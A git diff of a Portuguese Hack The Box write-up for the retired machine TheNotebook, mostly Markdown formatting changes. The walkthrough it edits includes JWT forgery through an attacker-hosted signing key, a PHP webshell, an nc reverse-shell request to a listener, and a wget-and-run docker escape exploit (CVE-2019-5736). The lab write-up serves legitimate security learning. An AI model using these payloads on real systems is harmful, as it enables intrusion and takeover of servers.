@@ -19,8 +19,9 @@ Olá pessoal!
 
 A máquina desta semana será **TheNotebook**, outra máquina Linux classificada como mediana do [Hack The Box](https://www.hackthebox.eu/), criada por [mostwanted002](https://app.hackthebox.eu/users/120514).
 
-\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
+</Alert>
 
 ![HTB TheNotebook](https://i.imgur.com/DSrrFJP.png)
 
@@ -31,7 +32,7 @@ Esta máquina foi bem interessante onde tive a oportunidade de conhecer mais sob
 Como de costume, iniciamos com um scan rápido do `nmap` para verificar quais serviços temos publicados nesta máquina
 
 ```bash
-$ nmap -sC -sV -Pn -oA quick 10.10.10.230                                                                                       
+$ nmap -sC -sV -Pn -oA quick 10.10.10.230
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 15:05 -03
 Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
@@ -61,7 +62,7 @@ Acessando a página, notei que se tratava de um site HTTP simples, que utiliza o
 
 ![HTB TheNotebook - 80/TCP](https://i.imgur.com/kJx4QaU.png)
 
-O que imaginava se confirmou com a execução do `whatweb`, que listou apenas dados dos componentes já reconhecidos e servidor de apresentação, no caso o *Nginx*.
+O que imaginava se confirmou com a execução do `whatweb`, que listou apenas dados dos componentes já reconhecidos e servidor de apresentação, no caso o _Nginx_.
 
 ```bash
 $ whatweb 10.10.10.230
@@ -99,7 +100,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 Como não encontrei nada específico da aplicação, decidi interagir um pouco com ela enquanto inspecionava as requisições utilizando o Burp Suite, a fim de identificar alguma eventual forma de exploração.
 
-Iniciei por criar uma conta, clicando no link *Register*, onde me foram solicitadas informações básicas, conforme imagem abaixo, as quais após submissão resultaram na criação da conta sem maiores problemas.
+Iniciei por criar uma conta, clicando no link _Register_, onde me foram solicitadas informações básicas, conforme imagem abaixo, as quais após submissão resultaram na criação da conta sem maiores problemas.
 
 ![HTB TheNotebook - SignUp](https://i.imgur.com/e49Cij7.png)
 
@@ -128,8 +129,8 @@ Set-Cookie: uuid=796e6cc3-aa50-4f87-b74f-408146886c66; Path=/
 
 Analisando seu conteúdo no site [jwt.ms](https://jwt.ms/), notei detalhes muito relevantes e que poderia nos permitir elevar nosso privilégio:
 
-* Cabeçalho `kid`, que define o caminho da chave privada em um HTTP server em execução no application server, possivelmente utilizado para assinar e validar os tokens;
-* Payload `admin_cap`, que possivelmente contém um valor binário ou sequencial, que define o **nível de privilégio** do usuário, que no caso do usuário recém-criado, é 0.
+- Cabeçalho `kid`, que define o caminho da chave privada em um HTTP server em execução no application server, possivelmente utilizado para assinar e validar os tokens;
+- Payload `admin_cap`, que possivelmente contém um valor binário ou sequencial, que define o **nível de privilégio** do usuário, que no caso do usuário recém-criado, é 0.
 
 ```json
 {
@@ -143,7 +144,7 @@ Analisando seu conteúdo no site [jwt.ms](https://jwt.ms/), notei detalhes muito
 }.[Signature]
 ```
 
-O fato neste momento é: Não podemos modificar o token emitido sem assiná-lo novamente com a mesma chave presente no servidor, porém, uma vez que o token traz consigo a URI da chave utilizada para sua assinatura e validação, pode ser que tenhamos alguma chance recriando este token, assinando com uma chave RSA própria e **publicá-la para que o backend possa acessá-lo**, mas isso só poderemos confirmar testando \:stuck\_out\_tongue\_winking\_eye:.
+O fato neste momento é: Não podemos modificar o token emitido sem assiná-lo novamente com a mesma chave presente no servidor, porém, uma vez que o token traz consigo a URI da chave utilizada para sua assinatura e validação, pode ser que tenhamos alguma chance recriando este token, assinando com uma chave RSA própria e **publicá-la para que o backend possa acessá-lo**, mas isso só poderemos confirmar testando \:stuck_out_tongue_winking_eye:.
 
 ## Acesso inicial
 
@@ -151,20 +152,20 @@ Uma vez que precisamos criar um token, buscando por uma forma simples de fazê-l
 
 Alcancei o objetivo acima a partir da execução dos seguintes passos:
 
-* Criação da chave RSA conforme linhas de comando abaixo. Teremos como output o conteúdo da chave pública e, no arquivo especificado, a chave privada.
+- Criação da chave RSA conforme linhas de comando abaixo. Teremos como output o conteúdo da chave pública e, no arquivo especificado, a chave privada.
 
 ```bash
 openssl req -nodes -new -x509 -keyout privKey.key -noout -pubkey
 ```
 
-* Publicação da chave utilizando um python HTTP Server simples, a ser especificado no token, para que o webserver busque pelo menos durante o processo de validação.
+- Publicação da chave utilizando um python HTTP Server simples, a ser especificado no token, para que o webserver busque pelo menos durante o processo de validação.
 
 ```bash
 python3 -m http.server 7070
 ```
 
-* Após a criação da chave, criado um script, conforme conteúdo abaixo, utilizando os valores dos arquivos de chave pública e privada e assinando o payload. Este script utiliza exemplos da página [Usage Examples](https://pyjwt.readthedocs.io/en/stable/usage.html) da documentação oficial da biblioteca.
-  * Necessário instalar o modulo utilizado com o comando `pip3 install pyjwt`. Caso o module `jwt` esteja instalado, necessário removê-lo antes da instalação deste módulo
+- Após a criação da chave, criado um script, conforme conteúdo abaixo, utilizando os valores dos arquivos de chave pública e privada e assinando o payload. Este script utiliza exemplos da página [Usage Examples](https://pyjwt.readthedocs.io/en/stable/usage.html) da documentação oficial da biblioteca.
+  - Necessário instalar o modulo utilizado com o comando `pip3 install pyjwt`. Caso o module `jwt` esteja instalado, necessário removê-lo antes da instalação deste módulo
 
 ```python
 #!/usr/bin/python3
@@ -190,7 +191,7 @@ $ python3 generate-jwt.py
 eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMTY6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjoxfQ.WMokYjjMMECoF2UWM2fcMVcR99X34dHXwuj8nXqBlQWOnwC1NdBoO6PD-ZHjAZ5p969Jbf4XnRKZedAAokxvIgG2ymYNV1F8CcDzDfuHlMlk_CiYGvimoJWgvA3S-24KDql2bRrvJgoPbKKjqJ5Ir7mWZF1USGSwsttc9Ff1qniFAWTJ8CXkTLtfR498_rY_uIJfBdvqTbi3C9fWJcnSwjCGROkEGxCYve4cf5rjFvm_D_G5-S8oWkXICYAFp5lMQ288E0qGQp04nD16H1v2YzOROolNDeqMVB2uaI060xjKEA8mv6taa095q7rEqzpzXSj21Uq2-xcZonk0LI1-yg
 ```
 
-* O token gerado pelo conteúdo acima, conforme JWT.ms, gerou o payload abaixo:
+- O token gerado pelo conteúdo acima, conforme JWT.ms, gerou o payload abaixo:
 
 ```json
 {
@@ -204,7 +205,7 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMTY6NzA3MC9w
 }.[Signature]
 ```
 
-* Uma vez que os parâmetros foram gerados conforme esperado, é chegado o momento de alterar o valor do cookie no navegador e **:boom:**: um request do backend foi recebido no HTTP server para validar a sua assinatura e agora podemos ver a opção **Admin Panel** ao acessar o portal \:smile:
+- Uma vez que os parâmetros foram gerados conforme esperado, é chegado o momento de alterar o valor do cookie no navegador e **:boom:**: um request do backend foi recebido no HTTP server para validar a sua assinatura e agora podemos ver a opção **Admin Panel** ao acessar o portal \:smile:
 
 ```bash
 python3 -m http.server 7070Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...10.10.10.230 - - [10/Jun/2021 18:45:24] "GET /privKey.key HTTP/1.1" 200 -
@@ -212,11 +213,11 @@ python3 -m http.server 7070Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:707
 
 ![HTB TheNotebook - Admin Panel](https://i.imgur.com/NrGXJx9.png)
 
-* Analisando o conteúdo do que é possível se fazer na aplicação a partir do painel administrativo, temos duas opções básicas: listar as notas existentes e realizar o upload de um arquivo.
+- Analisando o conteúdo do que é possível se fazer na aplicação a partir do painel administrativo, temos duas opções básicas: listar as notas existentes e realizar o upload de um arquivo.
 
 ![HTB TheNotebook - Admin Options](https://i.imgur.com/fSYkzLZ.png)
 
-* Analisando a seção *View Notes*, pudemos listar todas as notas da aplicação, conforme abaixo. Destaque para as notas do usuário **admin** que cita a existência de backup deste servidor e que existe uma **vulnerabilidade de arquivos PHP sendo executados** pelo servidor de apresentação:
+- Analisando a seção _View Notes_, pudemos listar todas as notas da aplicação, conforme abaixo. Destaque para as notas do usuário **admin** que cita a existência de backup deste servidor e que existe uma **vulnerabilidade de arquivos PHP sendo executados** pelo servidor de apresentação:
 
 | Title                 | Note                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Owner |
 | --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----- |
@@ -227,15 +228,16 @@ python3 -m http.server 7070Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:707
 
 Já que possivelmente arquivos do tipo PHP sejam interpretados pelo servidor, decidi realizar um teste, onde os passos abaixo foram executados:
 
-* Acessando a opção *File Upload* temos uma página simples para envio de arquivos, a qual vamos inspecionar as requisições a partir do Burp Suite
+- Acessando a opção _File Upload_ temos uma página simples para envio de arquivos, a qual vamos inspecionar as requisições a partir do Burp Suite
 
-  ![HTB TheNotebook - File Upload](https://i.imgur.com/fgI2wmr.png)
-  * Criando um payload PHP para webshell simples com o conte conteúdo `<?php system($_GET['cmd']);?>`, tentei realizar seu upload a partir do formulário e não tive nenhum tipo de bloqueio nesta ação.
-  * Após upload, o arquivo foi listado na página e no botão *View* relacionado, o caminho onde poderia acessar o conteúdo enviado.
+![HTB TheNotebook - File Upload](https://i.imgur.com/fgI2wmr.png)
+
+- Criando um payload PHP para webshell simples com o conte conteúdo `<?php system($_GET['cmd']);?>`, tentei realizar seu upload a partir do formulário e não tive nenhum tipo de bloqueio nesta ação.
+- Após upload, o arquivo foi listado na página e no botão _View_ relacionado, o caminho onde poderia acessar o conteúdo enviado.
   ![HTB TheNotebook - Uploaded Files](https://i.imgur.com/aCdIwnN.png)
-  * Ao copiar a URI deste arquivo, realizando chamadas simples com o queryString `cmd=id`, conforme previsto no payload criado, pude constatar que poderíamos obter um shell reverso deste modo já que obtemos execução remota de código \:smiley:
+- Ao copiar a URI deste arquivo, realizando chamadas simples com o queryString `cmd=id`, conforme previsto no payload criado, pude constatar que poderíamos obter um shell reverso deste modo já que obtemos execução remota de código \:smiley:
   ![HTB TheNotebook - Simple WebShell](https://i.imgur.com/eSH3rQY.png)
-  * Por fim, para obter um shell reverso em si, iniciei um listener usando o `nc` e executei a chamada abaixo, onde obtive o sucesso esperado \:smile:
+- Por fim, para obter um shell reverso em si, iniciei um listener usando o `nc` e executei a chamada abaixo, onde obtive o sucesso esperado \:smile:
 
 ```http
 GET /1e49f8a12603040cc99b2dd39f423b09.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.10.10+4443+>/tmp/f HTTP/1.1
@@ -253,10 +255,10 @@ Connection: close
 
 Após obter o shell reverso, iniciada enumeração da máquina com a conta `www-data`, a qual é utilizada para execução do webserver. Os seguintes itens foram listados após execução do `linpeas.sh`:
 
-* Usuários com console e suas permissões
-  * `noah:x:1000:1000:Noah:/home/noah:/bin/bash`
-  * `root:x:0:0:root:/root:/bin/bash`
-* Existência da pasta `/var/backups`, inclusive mencionada durante as notas obtidas anteriormente
+- Usuários com console e suas permissões
+  - `noah:x:1000:1000:Noah:/home/noah:/bin/bash`
+  - `root:x:0:0:root:/root:/bin/bash`
+- Existência da pasta `/var/backups`, inclusive mencionada durante as notas obtidas anteriormente
 
 Com este item também foi mencionado nas notas encontradas na aplicação, iniciando pela inspeção dos arquivos em `/var/backups`, notei que temos alguns arquivos aos quais não temos acesso, porém um deles me chamou a atenção, sendo o arquivo `home.tar.gz`, com acesso de leitura global, possivelmente contendo algum tipo de informação.
 
@@ -353,7 +355,7 @@ Analisando especificamente o conteúdo do arquivo `create_db.py` notei que temos
     ]
 ```
 
-Como não encontrei estas hashes em nenhum site público (Crackstation, por exemplo) significa que não devem ser senhas de wordlists conhecidas, como a `rockyou.txt`, frequentemente utilizada em CTFs. Decidi então partir para enumeração de possíveis vulnerabilidades de *docker breakout*, ou seja, escapar do container para o host docker.
+Como não encontrei estas hashes em nenhum site público (Crackstation, por exemplo) significa que não devem ser senhas de wordlists conhecidas, como a `rockyou.txt`, frequentemente utilizada em CTFs. Decidi então partir para enumeração de possíveis vulnerabilidades de _docker breakout_, ou seja, escapar do container para o host docker.
 
 Buscando por alguns materiais, encontrei o repositório [stealthcopter/deepce: Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) (github.com)](https://github.com/stealthcopter/deepce) onde o script promete auxiliar na enumeração de características vulneráveis que permita esse tipo de ação.
 
@@ -369,14 +371,14 @@ Buscando por exploits encontrei o repositório [Frichetten/CVE-2019-5736-PoC: Po
 
 Para obter o shell de root, os passos seguintes foram executados, conforme visto neste blog post ([Reproduction of docker escape vulnerability (CVE-2019-5736) - Programmer Sought](https://www.programmersought.com/article/71804432772/))
 
-* Baixado e editado o script com o payload para execução de shell reverso, chamado `escape.go`
-* Compilado utilizando os parâmetros selecionados
+- Baixado e editado o script com o payload para execução de shell reverso, chamado `escape.go`
+- Compilado utilizando os parâmetros selecionados
 
 ```plaintext
 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build escape.go
 ```
 
-* Copiado exploit para a máquina vítima, dentro do container, seguido da sua execução
+- Copiado exploit para a máquina vítima, dentro do container, seguido da sua execução
 
 ```bash
 wget http://10.10.10.10/escape
@@ -384,7 +386,7 @@ chmod +x escape
 ./escape
 ```
 
-* Uma vez que o exploit substitui `/bin/sh` da máquina por um shell script malicioso, executado a linha de comando a seguir para iniciar o trigger para a exploração
+- Uma vez que o exploit substitui `/bin/sh` da máquina por um shell script malicioso, executado a linha de comando a seguir para iniciar o trigger para a exploração
 
 ```bash
 sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
